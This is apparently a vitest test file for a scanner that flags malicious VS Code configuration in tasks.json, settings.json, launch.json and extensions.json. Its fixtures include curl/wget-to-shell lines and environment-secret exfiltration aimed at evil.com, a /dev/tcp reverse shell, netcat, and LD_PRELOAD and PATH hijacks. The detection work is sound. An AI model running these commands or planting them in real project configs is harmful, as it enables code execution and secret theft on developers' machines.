/**
 * Tests for VS Code configuration detection rules
 * Covers tasks.json, settings.json, launch.json, extensions.json attacks
 */

import { describe, it, expect } from 'vitest';
import { applyRule, matchFile } from '../../src/scanner/matcher';
import { vscodeRules } from '../../src/rules/vscode-rules';

function getRule(id: string) {
  const rule = vscodeRules.find((r) => r.id === id);
  if (!rule) throw new Error(`Rule not found: ${id}`);
  return rule;
}

function expectDetection(id: string, filePath: string, content: string) {
  const rule = getRule(id);
  expect(matchFile(filePath, rule.filePatterns)).toBe(true);
  const findings = applyRule(rule, filePath, content);
  expect(findings.length).toBeGreaterThan(0);
  return findings;
}

function expectNoDetection(id: string, filePath: string, content: string) {
  const rule = getRule(id);
  if (!matchFile(filePath, rule.filePatterns)) return; // file doesn't match, that's fine
  const findings = applyRule(rule, filePath, content);
  expect(findings).toHaveLength(0);
}

// ============================================
// tasks.json rules
// ============================================

describe('vscode-task-auto-run', () => {
  it('detects runOn: folderOpen', () => {
    expectDetection(
      'vscode-task-auto-run',
      '.vscode/tasks.json',
      `{
        "version": "2.0.0",
        "tasks": [{
          "label": "build",
          "type": "shell",
          "command": "node setup.js",
          "runOn": "folderOpen"
        }]
      }`
    );
  });

  it('does not flag normal tasks', () => {
    expectNoDetection(
      'vscode-task-auto-run',
      '.vscode/tasks.json',
      `{
        "version": "2.0.0",
        "tasks": [{
          "label": "build",
          "type": "shell",
          "command": "npm run build"
        }]
      }`
    );
  });
});

describe('vscode-task-hidden-terminal', () => {
  it('detects reveal: never', () => {
    expectDetection(
      'vscode-task-hidden-terminal',
      '.vscode/tasks.json',
      `{
        "tasks": [{
          "label": "stealth",
          "presentation": { "reveal": "never" }
        }]
      }`
    );
  });

  it('allows reveal: always', () => {
    expectNoDetection(
      'vscode-task-hidden-terminal',
      '.vscode/tasks.json',
      `{ "presentation": { "reveal": "always" } }`
    );
  });
});

describe('vscode-task-background', () => {
  it('detects isBackground: true', () => {
    expectDetection(
      'vscode-task-background',
      '.vscode/tasks.json',
      `{ "tasks": [{ "isBackground": true }] }`
    );
  });

  it('does not flag isBackground: false', () => {
    expectNoDetection(
      'vscode-task-background',
      '.vscode/tasks.json',
      `{ "tasks": [{ "isBackground": false }] }`
    );
  });
});

describe('vscode-task-auto-close', () => {
  it('detects close: true', () => {
    expectDetection(
      'vscode-task-auto-close',
      '.vscode/tasks.json',
      `{ "presentation": { "close": true } }`
    );
  });
});

describe('vscode-task-base64-command', () => {
  it('detects base64-encoded command', () => {
    expectDetection(
      'vscode-task-base64-command',
      '.vscode/tasks.json',
      `{ "command": "echo base64 aHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkLnNo" }`
    );
  });

  it('detects base64 --decode with long string', () => {
    expectDetection(
      'vscode-task-base64-command',
      '.vscode/tasks.json',
      `{ "command": "echo payload | base64 --decode YWJjZGVmZ2hpamtsbW5vcHFyc3Q=" }`
    );
  });
});

describe('vscode-task-curl-wget', () => {
  it('detects curl piped to bash', () => {
    expectDetection(
      'vscode-task-curl-wget',
      '.vscode/tasks.json',
      `{ "command": "curl https://evil.com/setup.sh | bash" }`
    );
  });

  it('detects wget piped to sh', () => {
    expectDetection(
      'vscode-task-curl-wget',
      '.vscode/tasks.json',
      `{ "command": "wget http://evil.com/x | sh" }`
    );
  });

  it('does not flag curl without pipe', () => {
    expectNoDetection(
      'vscode-task-curl-wget',
      '.vscode/tasks.json',
      `{ "command": "curl https://api.example.com/data -o file.json" }`
    );
  });
});

describe('vscode-task-suspicious-command', () => {
  it('detects netcat', () => {
    expectDetection(
      'vscode-task-suspicious-command',
      '.vscode/tasks.json',
      `{ "command": "nc -l 4444" }`
    );
  });

  it('detects /dev/tcp', () => {
    expectDetection(
      'vscode-task-suspicious-command',
      '.vscode/tasks.json',
      `{ "command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" }`
    );
  });

  it('detects command substitution', () => {
    expectDetection(
      'vscode-task-suspicious-command',
      '.vscode/tasks.json',
      '{ "command": "echo $(whoami)" }'
    );
  });
});

describe('vscode-task-env-exfil', () => {
  it('detects ${env:PRIVATE} syntax', () => {
    expectDetection(
      'vscode-task-env-exfil',
      '.vscode/tasks.json',
      `{ "command": "curl -d \${env:PRIVATE_KEY} https://evil.com" }`
    );
  });

  it('detects ${env:SECRET} syntax', () => {
    expectDetection(
      'vscode-task-env-exfil',
      '.vscode/tasks.json',
      `{ "command": "curl -d \${env:SECRET_KEY} https://evil.com" }`
    );
  });

  it('does not flag normal env vars', () => {
    expectNoDetection(
      'vscode-task-env-exfil',
      '.vscode/tasks.json',
      `{ "command": "echo $HOME" }`
    );
  });
});

// ============================================
// settings.json rules
// ============================================

describe('vscode-settings-terminal-profile', () => {
  it('detects custom terminal profile with args', () => {
    // The regex looks for terminal.integrated.profiles.X followed by non-quote chars then "args" :
    // so structure must not have quotes between the profiles key and "args"
    expectDetection(
      'vscode-settings-terminal-profile',
      '.vscode/settings.json',
      `terminal.integrated.profiles.linux custom "args" : ["-c"]`
    );
  });
});

describe('vscode-settings-git-path-override', () => {
  it('detects suspicious git path override', () => {
    expectDetection(
      'vscode-settings-git-path-override',
      '.vscode/settings.json',
      `{ "git.path": "./malicious-git" }`
    );
  });

  it('does not flag standard system git path', () => {
    expectNoDetection(
      'vscode-settings-git-path-override',
      '.vscode/settings.json',
      `{ "git.path": "/usr/bin/git" }`
    );
  });
});

describe('vscode-settings-python-path-override', () => {
  it('detects suspicious python path', () => {
    expectDetection(
      'vscode-settings-python-path-override',
      '.vscode/settings.json',
      `{ "python.pythonPath": "./evil-binary" }`
    );
  });

  it('does not flag venv python path', () => {
    expectNoDetection(
      'vscode-settings-python-path-override',
      '.vscode/settings.json',
      `{ "python.pythonPath": "./venv/bin/python" }`
    );
  });
});

// ============================================
// launch.json rules
// ============================================

describe('vscode-launch-prelaunch-task', () => {
  it('detects preLaunchTask', () => {
    expectDetection(
      'vscode-launch-prelaunch-task',
      '.vscode/launch.json',
      `{ "configurations": [{ "preLaunchTask": "build" }] }`
    );
  });
});

describe('vscode-launch-runtime-override', () => {
  it('detects non-standard runtime executable', () => {
    expectDetection(
      'vscode-launch-runtime-override',
      '.vscode/launch.json',
      `{ "runtimeExecutable": "./evil-node" }`
    );
  });

  it('does not flag node runtime', () => {
    expectNoDetection(
      'vscode-launch-runtime-override',
      '.vscode/launch.json',
      `{ "runtimeExecutable": "node" }`
    );
  });
});

describe('vscode-launch-env-injection', () => {
  it('detects PATH override in env', () => {
    expectDetection(
      'vscode-launch-env-injection',
      '.vscode/launch.json',
      `{ "env": { "PATH": "/tmp/evil:$PATH" } }`
    );
  });

  it('detects LD_PRELOAD injection', () => {
    expectDetection(
      'vscode-launch-env-injection',
      '.vscode/launch.json',
      `{ "env": { "LD_PRELOAD": "/tmp/evil.so" } }`
    );
  });

  it('does not flag normal env vars', () => {
    expectNoDetection(
      'vscode-launch-env-injection',
      '.vscode/launch.json',
      `{ "env": { "NODE_ENV": "development" } }`
    );
  });
});

// ============================================
// extensions.json rules
// ============================================

describe('vscode-extensions-unknown-publisher', () => {
  it('detects extension recommendations', () => {
    expectDetection(
      'vscode-extensions-unknown-publisher',
      '.vscode/extensions.json',
      `{ "recommendations": ["evil-publisher.evil-ext"] }`
    );
  });
});

// ============================================
// General .vscode folder checks
// ============================================

describe('vscode-executable-file', () => {
  it('matches shell script in .vscode', () => {
    const rule = getRule('vscode-executable-file');
    expect(matchFile('.vscode/setup.sh', rule.filePatterns)).toBe(true);
    const findings = applyRule(rule, '.vscode/setup.sh', '#!/bin/bash\necho pwned');
    expect(findings.length).toBeGreaterThan(0);
  });

  it('matches .bat in .vscode', () => {
    const rule = getRule('vscode-executable-file');
    expect(matchFile('.vscode/run.bat', rule.filePatterns)).toBe(true);
  });

  it('does not match JSON in .vscode', () => {
    const rule = getRule('vscode-executable-file');
    expect(matchFile('.vscode/settings.json', rule.filePatterns)).toBe(false);
  });
});

describe('vscode-hidden-file', () => {
  it('matches hidden file in .vscode', () => {
    const rule = getRule('vscode-hidden-file');
    expect(matchFile('.vscode/.secret', rule.filePatterns)).toBe(true);
  });
});
